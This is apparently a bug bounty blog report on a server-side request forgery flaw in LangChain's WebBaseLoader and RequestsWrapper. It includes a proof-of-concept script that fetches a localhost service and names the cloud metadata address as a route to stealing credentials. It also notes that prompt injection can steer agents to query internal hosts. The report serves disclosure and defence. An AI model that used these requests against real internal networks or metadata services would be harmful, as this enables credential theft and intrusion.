---
title: "SSRF in LangChain WebBaseLoader & RequestsWrapper"
date: "2025-12-08"
excerpt: "A deep dive into a Server-Side Request Forgery (SSRF) vulnerability found in the langchain-community library. We explore how WebBaseLoader can be used to access internal network resources and discuss mitigation strategies."
coverImage: "/assets/blog/BugBounty/LangChainSSRF/CoverImage.jpg"
headerImage: "/assets/blog/BugBounty/LangChainSSRF/Header.jpg"
tags: ["Bug Bounty", "Vulnerability Research", "SSRF", "LangChain", "Python", "AppSec"]
series: "Bug Bounty Reports"
---

# Vulnerability Report: SSRF in LangChain Community 🦜🔗

During a recent code audit of the **LangChain** ecosystem, I identified a significant Server-Side Request Forgery (SSRF) risk in the `langchain-community` library.

**Summary:** The `WebBaseLoader` and `RequestsWrapper` components allow applications (such as LLM agents) to make HTTP requests to arbitrary URLs without validation. This includes sensitive internal resources like `localhost`, private network IPs, and cloud metadata services.

---

## 🔍 Technical Details

*   **Product:** LangChain Community (`langchain-community`)
*   **Vulnerability:** Server-Side Request Forgery (SSRF)
*   **Affected Components:**
    *   `libs/community/langchain_community/document_loaders/web_base.py`
    *   `libs/community/langchain_community/utilities/requests.py`

### The Core Issue

**1. WebBaseLoader (`web_base.py`)**

The `WebBaseLoader` is designed to scrape web content given a `web_path` (URL). However, it directly passes this URL to the underlying request library without checking if the destination is safe.

```python
# libs/community/langchain_community/document_loaders/web_base.py

class WebBaseLoader(BaseLoader):
    def __init__(self, web_path: Union[str, Sequence[str]] = "", ...):
        # ...
        self.web_paths = [web_path] # No validation of the URL scheme or destination

    def _scrape(self, url: str, ...):
        # ...
        html_doc = self.session.get(url, **self.requests_kwargs) # Direct request
```

**2. RequestsWrapper (`requests.py`)**

Similarly, the `RequestsWrapper`—often given to agents as a tool—exposes raw HTTP methods (`get`, `post`) directly to the LLM agent. If an agent is tricked (via prompt injection) or specifically instructed, it can query internal infrastructure.

```python
# libs/community/langchain_community/utilities/requests.py

class Requests(BaseModel):
    def get(self, url: str, **kwargs: Any) -> requests.Response:
        return requests.get(url, ...) # Direct request
```

### Contrast with `RecursiveUrlLoader`
Interestingly, the `RecursiveUrlLoader` component **does** include protection. It has a `prevent_outside` parameter (default: `True`) and explicitly warns about SSRF. The absence of this pattern in `WebBaseLoader` is what makes this notable.

---

## 🧪 Proof of Concept (PoC)

To demonstrate the risk, we simulated an internal service running on `localhost:9999` that should strictly be inaccessible to the outside world.

**Establish Internal Service:**
```bash
python -m http.server 9999 --bind 127.0.0.1
```

**Exploit Script:**
```python
from langchain_community.document_loaders import WebBaseLoader

def test_ssrf():
    target_url = "http://127.0.0.1:9999"
    print(f"[-] Attempting to load {target_url} using WebBaseLoader...")
    
    try:
        loader = WebBaseLoader(target_url)
        docs = loader.load()
        print("[+] Success! WebBaseLoader fetched the internal URL.")
        print(f"[+] Content preview: {docs[0].page_content[:50]}")
    except Exception as e:
        print(f"[-] Failed: {e}")

if __name__ == "__main__":
    test_ssrf()
```

**Result:**
The script successfully bypasses potential boundary expectations and reads the internal directory listing.

```
[-] Attempting to load http://127.0.0.1:9999 using WebBaseLoader...
[+] Success! WebBaseLoader fetched the internal URL.
[+] Content preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
```

---

## 💥 Impact

The impact varies by deployment but can be critical:
1.  **Cloud Metadata Theft:** Agents running on AWS/GCP/Azure could query `http://169.254.169.254` to steal instance credentials.
2.  **Internal Network Scanning:** An attacker could use the agent to map out internal services, finding unauthenticated Redis databases or admin panels.
3.  **Localhost Access:** Accessing services bound only to looppback interfaces.

---

## 🛡️ Recommendations

To fix this, maintainers and users should consider:

1.  **Documentation:** Adding prominent warnings to `WebBaseLoader` and `RequestsWrapper` regarding SSRF risks.
2.  **Input Validation:** Implementing an `allow_internal=False` flag by default, or an `allowed_domains` allowlist.
3.  **Network Restrictions:** In production, running these agents in a restricted network sandbox (e.g., using Kubernetes NetworkPolicies) to prevent egress to private IP ranges.

---

*This report highlights the importance of auditing third-party libraries, especially in the rapidly evolving LLM ecosystem where agents are often given broad network access.*
